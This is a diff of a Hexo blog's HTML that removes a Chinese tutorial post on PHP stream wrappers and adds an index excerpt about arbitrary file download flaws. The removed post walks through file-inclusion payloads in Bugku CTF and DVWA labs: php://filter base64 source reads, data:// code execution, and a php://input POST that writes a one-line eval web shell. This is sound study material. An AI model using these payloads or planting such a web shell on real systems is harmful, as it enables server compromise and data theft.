@@ -22,7 +22,7 @@
     <meta name="description" content="Saying and doing are two different things.">
     <meta http-equiv="Cache-control" content="no-cache">
     <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">
-    <title>了解PHP伪协议 · Lemon&#39;s blog</title>
+    <title>Lemon&#39;s blog</title>
     <style type="text/css">
     @font-face {
         font-family: 'Oswald-Regular';
@@ -203,23 +203,12 @@
 </head>
 
     
-        <body class="post-body">
-    
     
 <header class="header">
 
     <div class="read-progress"></div>
     <div class="header-sidebar-menu">&#xe775;</div>
     <!-- post页的toggle banner  -->
-    
-    <div class="banner">
-            <div class="blog-title">
-                <a href="/">Lemon&#39;s blog</a>
-            </div>
-            <div class="post-title">
-                <a href="#" class="post-name">了解PHP伪协议</a>
-            </div>
-    </div>
     
     <a class="home-link" href="/">Lemon's blog</a>
 </header>
@@ -231,76 +220,24 @@
 
 
 
-
-height:50vh;
 ">
     
     <!-- 主页  -->
-    
-    
-    <!-- 404页  -->
             
     <div class="site-intro-placeholder"></div>
-    <div class="site-intro-img" style="background-image: url(/intro/744896.png)"></div>
+    <div class="site-intro-img" style="background-image: url(/)"></div>
     <div class="site-intro-meta">
         <!-- 标题  -->
         <h1 class="intro-title">
             <!-- 主页  -->
-            
-            了解PHP伪协议
-            <!-- 404 -->
             
         </h1>
         <!-- 副标题 -->
         <p class="intro-subtitle">
             <!-- 主页副标题  -->
             
-            
-                Record my learning process of PHP.
-            
-            <!-- 404 -->
-            
         </p>
         <!-- 文章页meta -->
-        
-            <div class="post-intros">
-                <!-- 文章页标签  -->
-                
-                    <div class="post-intro-tags">
-    
-        <a class="post-tag" href="javascript:void(0);" data-tags="PHP">PHP</a>
-    
-</div>
-                
-                
-                    <div class="post-intro-read">
-                        <span>字数统计: <span class="post-count word-count">1.2k</span>阅读时长: <span class="post-count reading-time">4 min</span></span>
-                    </div>
-                
-                <div class="post-intro-meta">
-                    <span class="post-intro-calander iconfont-archer">&#xe676;</span>
-                    <span class="post-intro-time">2019/08/31</span>
-                    
-                    <span id="busuanzi_container_page_pv" class="busuanzi-pv">
-                        <span class="iconfont-archer">&#xe602;</span>
-                        <span id="busuanzi_value_page_pv"></span>
-                    </span>
-                    
-                    <span class="shareWrapper">
-                        <span class="iconfont-archer shareIcon">&#xe71d;</span>
-                        <span class="shareText">Share</span>
-                        <ul class="shareList">
-                            <li class="iconfont-archer share-qr" data-type="qr">&#xe75b;
-                                <div class="share-qrcode"></div>
-                            </li>
-                            <li class="iconfont-archer" data-type="weibo">&#xe619;</li>
-                            <li class="iconfont-archer" data-type="qzone">&#xe62e;</li>
-                            <li class="iconfont-archer" data-type="twitter">&#xe634;</li>
-                            <li class="iconfont-archer" data-type="facebook">&#xe67a;</li>
-                        </ul>
-                    </span>
-                </div>
-            </div>
         
     </div>
 </div>
@@ -401,109 +338,42 @@ height:50vh;
 </script>        
         <img class="loading" src="/assets/loading.svg" style="display: block; margin: 6rem auto 0 auto; width: 6rem; height: 6rem;" />
         <div class="container container-unloaded">
-            <main class="main post-page">
-    <article class="article-entry">
-        <p><strong>前言：最近做题web题很多都涉及了PHP伪协议，这次就来详细的了解总结一下！</strong></p>
-<hr>
-<p>练习每个协议前，相关的配置必须开启或者关闭才不会报错，可以参考这张图片<br><img src="http://img-blog.csdnimg.cn/20190825104423570.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNDMxMTU4,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>下面就来了解PHP伪协议</p>
-<h2 id="php"><a href="#php" class="headerlink" title="php://"></a><strong>php://</strong></h2><p>说明：</p>
-<blockquote>
-<p>PHP 提供了一些杂项输入/输出（IO）流，允许访问 PHP 的输入输出流、标准输入输出和错误描述符， 内存中、磁盘备份的临时文件流以及可以操作其他读取写入文件资源的过滤器。 </p>
-</blockquote>
-<p><code>php://</code>  访问输入输出流，有许多子协议,下面就来学习一下</p>
-<h4 id="一-php-filter"><a href="#一-php-filter" class="headerlink" title="(一)php://filter"></a><strong>(一)php://filter</strong></h4><p>说明：</p>
-<blockquote>
-<p>php://filter 是一种元封装器， 设计用于数据流打开时的筛选过滤应用。 这对于一体式（all-in-one）的文件函数非常有用，类似 readfile()、 file() 和 file_get_contents()， 在数据流内容读取之前没有机会应用其他过滤器。 </p>
-</blockquote>
-<p>简单来理解就是：<code>php://filter</code>是可以作为一个中间流来处理其他流，可以进行任意文件的读取。而且当使用不同的参数可以达到不同的目的和效果：<br><img src="http://img-blog.csdnimg.cn/20190824111041940.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNDMxMTU4,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>例子可以看PHP官网，特别详细<br><a href="https://www.php.net/manual/zh/wrappers.php.php" target="_blank" rel="noopener">php://filter</a></p>
-<p>这里通过<strong>bugku</strong>中的一道题来练习一下<br><img src="http://img-blog.csdnimg.cn/20190824112004687.png" alt="在这里插入图片描述"><br>打开链接后发现<code>?file=show.php</code>，涉及文件包含漏洞，题目中又提示说：flag在index中，那就可以用<code>php://filter</code>中的<code>read</code>参数查看源文件内容</p>
-<p>构造payload：</p>
-<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?file=php:<span class="comment">//filter/read=convert.base64-encode/resource=index.php</span></span><br></pre></td></tr></table></figure>
-<p>这里之所以进行base64编码是为了PHP不对其解析,这个payload也是常用的任意读取文件语句，只要将后面的页面修改即可。</p>
-<p>可以参考官网的例子构造语句</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">/* 这会以大写字母输出 www.example.com 的全部内容 */</span></span><br><span class="line">readfile(<span class="string">"php://filter/read=string.toupper/resource=http://www.example.com"</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">/* 这会和以上所做的一样，但还会用 ROT13 加密。 */</span></span><br><span class="line">readfile(<span class="string">"php://filter/read=string.toupper|string.rot13/resource=http://www.example.com"</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
-<p><img src="http://img-blog.csdnimg.cn/20190824113413640.png" alt="在这里插入图片描述"><br>解码得出源代码和flag</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">&lt;html&gt;</span><br><span class="line">    &lt;title&gt;Bugku-ctf&lt;/title&gt;</span><br><span class="line">    </span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">	error_reporting(<span class="number">0</span>);</span><br><span class="line">	<span class="keyword">if</span>(!$_GET[file])&#123;<span class="keyword">echo</span> <span class="string">'&lt;a href="./index.php?file=show.php"&gt;click me? no&lt;/a&gt;'</span>;&#125;</span><br><span class="line">	$file=$_GET[<span class="string">'file'</span>];</span><br><span class="line">	<span class="keyword">if</span>(strstr($file,<span class="string">"../"</span>)||stristr($file, <span class="string">"tp"</span>)||stristr($file,<span class="string">"input"</span>)||stristr($file,<span class="string">"data"</span>))&#123;</span><br><span class="line">		<span class="keyword">echo</span> <span class="string">"Oh no!"</span>;</span><br><span class="line">		<span class="keyword">exit</span>();</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">include</span>($file); </span><br><span class="line"><span class="comment">//flag:flag&#123;edulcni_elif_lacol_si_siht&#125;</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure>
-<p>可以看到源代码中对用户输入的<code>file</code>参数进行了过滤，但是源码中的<code>include</code>函数将用户输入的引入php文件并执行，如果执行不成功，就返回文件的源码，所以才要进行base64编码。</p>
-<h4 id="二-php-input"><a href="#二-php-input" class="headerlink" title="(二)php://input"></a>(二)php://input</h4><p>说明：</p>
-<blockquote>
-<p>php://input 是个可以访问请求的原始数据的只读流，可以读取没有处理过的POST数据。</p>
-</blockquote>
-<p><code>php://input</code>可以将要执行的语法<code>php代码</code>写在post中提交，下面通过DVWA来练习一下<br><img src="http://img-blog.csdnimg.cn/20190824191434377.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNDMxMTU4,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>若有写入权限，也可以写入一句话木马</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">POST DATA</span><br><span class="line"><span class="meta">&lt;?php</span> fputs(fopen(<span class="string">'1juhua.php'</span>,<span class="string">'w'</span>),<span class="string">'&lt;?php @eval($_GET[cmd]); ?&gt;'</span>); <span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
-<h2 id="file"><a href="#file" class="headerlink" title="file://"></a><strong>file://</strong></h2><p>说明：</p>
-<blockquote>
-<p>file:// — 访问本地文件系统，当指定了一个相对路径（不以/、\、\或 Windows 盘符开头的路径）提供的路径将基于当前的工作目录。</p>
-</blockquote>
-<p>模仿大师傅搭建一个本地靶场<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line">@$file = <span class="keyword">isset</span>($_GET[file])?$_GET[<span class="string">'file'</span>]:<span class="string">'ctf.php'</span>;</span><br><span class="line"><span class="keyword">include_once</span>($file);</span><br><span class="line">highlight_file($file);</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></p>
-<p><img src="http://img-blog.csdnimg.cn/20190825105148604.png" alt="在这里插入图片描述"><br><img src="http://img-blog.csdnimg.cn/20190825105156973.png" alt="在这里插入图片描述"><br>使用<code>file</code>协议访问本地文件，构造payload：</p>
-<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:<span class="comment">//127.0.0.1/2.php?file=file://D:/PHPstudys/PHPTutorial/WWW/1.txt</span></span><br></pre></td></tr></table></figure>
-<p>访问成功<br><img src="http://img-blog.csdnimg.cn/20190825105341175.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNDMxMTU4,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>也可以用这个靶场来练习<code>php://filter</code>协议</p>
-<p>构造payload：</p>
-<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:<span class="comment">//127.0.0.1/2.php?file=php://filter/read/convert.base64-encode/resource=1.txt</span></span><br></pre></td></tr></table></figure>
-<p><img src="http://img-blog.csdnimg.cn/20190825105602576.png" alt="在这里插入图片描述"><br>进行解码<br><img src="http://img-blog.csdnimg.cn/20190825105718645.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNDMxMTU4,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>直接读取也可以</p>
-<p>payload：</p>
-<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:<span class="comment">//127.0.0.1/2.php?file=php://filter/resource=1.txt</span></span><br></pre></td></tr></table></figure>
-<p><img src="http://img-blog.csdnimg.cn/20190825105948112.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNDMxMTU4,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
-<h2 id="zip-协议"><a href="#zip-协议" class="headerlink" title="zip://协议"></a><strong>zip://协议</strong></h2><blockquote>
-<p>zip:// [压缩文件绝对路径]#[压缩文件内的子文件名]</p>
-</blockquote>
-<h2 id="phar-协议"><a href="#phar-协议" class="headerlink" title="phar:// 协议"></a><strong>phar:// 协议</strong></h2><blockquote>
-<p>phar://协议与zip://类似，同样可以访问zip格式压缩包内容</p>
-</blockquote>
-<h2 id="data-协议"><a href="#data-协议" class="headerlink" title="data:// 协议"></a><strong>data:// 协议</strong></h2><blockquote>
-<p>data: text/plain,&lt;?php 执行内容 ?&gt;<br>data://text/plain,<br>data://text/plain;base64,</p>
-</blockquote>
-<p>在DVWA中进行测试</p>
-<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:<span class="comment">//127.0.0.1/DVWA/vulnerabilities/fi/?page=data:text/plain,&lt;?echo phpinfo()?&gt;</span></span><br></pre></td></tr></table></figure>
-<p><img src="http://img-blog.csdnimg.cn/20190831102250530.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNDMxMTU4,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>也可以用base64的格式编码PHP代码</p>
-<p><img src="http://img-blog.csdnimg.cn/20190831102747650.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNDMxMTU4,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:<span class="comment">//127.0.0.1/DVWA/vulnerabilities/fi/?page=data:text/plain;base64,PD9lY2hvIHBocGluZm8oKT8%2b</span></span><br></pre></td></tr></table></figure></p>
-<p>注意要按照这个格式才能成功<code>data://text/plain;base64,</code>还有base64编码后的加号和等号要手动的url编码，否则无法识别。</p>
-<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">+ %<span class="number">2b</span></span><br><span class="line">= %<span class="number">3</span>d</span><br></pre></td></tr></table></figure>
-<p><img src="http://img-blog.csdnimg.cn/20190831103006294.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNDMxMTU4,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
-<h2 id="http-amp-https-协议"><a href="#http-amp-https-协议" class="headerlink" title="http:// &amp; https:// 协议"></a><strong>http:// &amp; https:// 协议</strong></h2><blockquote>
-<p>常规 URL 形式，允许通过 HTTP 1.0 的 GET方法，以只读访问文件或资源。</p>
-</blockquote>
-<p><img src="http://img-blog.csdnimg.cn/2019083110352463.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNDMxMTU4,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
-<hr>
-<p>总结：这次学习大致了解了一些PHP伪协议，但还是需要结合一些题目来练习一下，这次就先总结到这，等理解更深后，再来详细总结一下。</p>
-
+            <main class="main index-page">
+    
+    
+    
+    
+    
+    
+    <article class="index-post">
+        <a class="abstract-title" href="/2019/08/09/任意文件下载漏洞/">
+            
+                <span>任意文件下载漏洞简析</span>
+        </a>
+        <div class="abstract-content">
+            前言：之前没有接触过这个知识，恰好这次有一道题考了这方面的知识，就来详细的学习一下任意文件下载漏洞
+任意下载漏洞简介由于业务需求，很多网站往往需要提供文件(附件)下载的功能块，但是如果对下载的文件没有做限制，直接通过绝对路径对其文件进行下载，那么，恶意用户就可以利用这种方式下载服务器的敏感文件，对服务器进行进一步的威胁和攻击。
+任意下载漏洞的危害通过任意文件下载，可以下载服务器的任意文件，web业务的代码，服务器和系统的具体配置信息，也可以下载数据库的配置信息，以及对内网的信息探测等等。
+通过上面的简单介绍，可以看出任意下载漏洞是很常见的，如果对用户查看或下载的文件不做限制，就又可能被利...
+        </div>
+        <div class="abstract-post-meta">
+            <!-- date  -->
+            <div class="abstract-date">
+                <span class="abstract-calander iconfont-archer">&#xe676;</span><span class="abstract-time">2019/08/09</span>
+            </div>
+            <!-- tags  -->
+            
+            <div class="abstract-tags">
+    
+        <a class="post-tag" href="javascript:void(0);" data-tags="任意文件下载">任意文件下载</a>
+    
+</div>
+            
+        </div>
     </article>
-    <!-- license  -->
     
     <!-- paginator  -->
-    <ul class="post-paginator">
-        <li class="next">
-            
-                <div class="nextSlogan">Next Post</div>
-                <a href="/2019/09/02/Bugku—web题总结(三)/" title="Bugku—web题总结(三)">
-                    <div class="nextTitle">Bugku—web题总结(三)</div>
-                </a>
-            
-        </li>
-        <li class="previous">
-            
-                <div class="prevSlogan">Previous Post</div>
-                <a href="/2019/08/28/python学习（函数）/" title="python学习（函数）">
-                    <div class="prevTitle">python学习（函数）</div>
-                </a>
-            
-        </li>
-    </ul>
-    <!-- 评论插件 -->
-    <!-- 来必力City版安装代码 -->
-
-<!-- City版安装代码已完成 -->
     
-    
-    <!-- partial('_partial/comment/changyan') -->
-    <!--PC版-->
-
-
-    
-    
-
-    <!-- 评论 -->
 </main>
             <!-- profile -->
             
@@ -594,24 +464,6 @@ height:50vh;
 </footer>
     </div>
     <!-- toc -->
-    
-    <div class="toc-wrapper" style=
-    
-
-
-
-
-
-
-
-top:50vh;
-
-    >
-        <div class="toc-catalog">
-            <span class="iconfont-archer catalog-icon">&#xe613;</span><span>CATALOG</span>
-        </div>
-        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#php"><span class="toc-number">1.</span> <span class="toc-text">php://</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#一-php-filter"><span class="toc-number">1.0.1.</span> <span class="toc-text">(一)php://filter</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#二-php-input"><span class="toc-number">1.0.2.</span> <span class="toc-text">(二)php://input</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#file"><span class="toc-number">2.</span> <span class="toc-text">file://</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#zip-协议"><span class="toc-number">3.</span> <span class="toc-text">zip://协议</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#phar-协议"><span class="toc-number">4.</span> <span class="toc-text">phar:// 协议</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#data-协议"><span class="toc-number">5.</span> <span class="toc-text">data:// 协议</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#http-amp-https-协议"><span class="toc-number">6.</span> <span class="toc-text">http:// &amp; https:// 协议</span></a></li></ol>
-    </div>
     
     <div class="back-top iconfont-archer">&#xe639;</div>
     <div class="sidebar sidebar-hide">
@@ -1757,8 +1609,6 @@ jsonContent:
     
     </div>
     <!-- async load share.js -->
-    
-        <script src="/scripts/share.js" async></script>    
      
 	<!-- 雪花特效 -->
 	<script type="text/javascript" src="\lib\snow.js"></script>
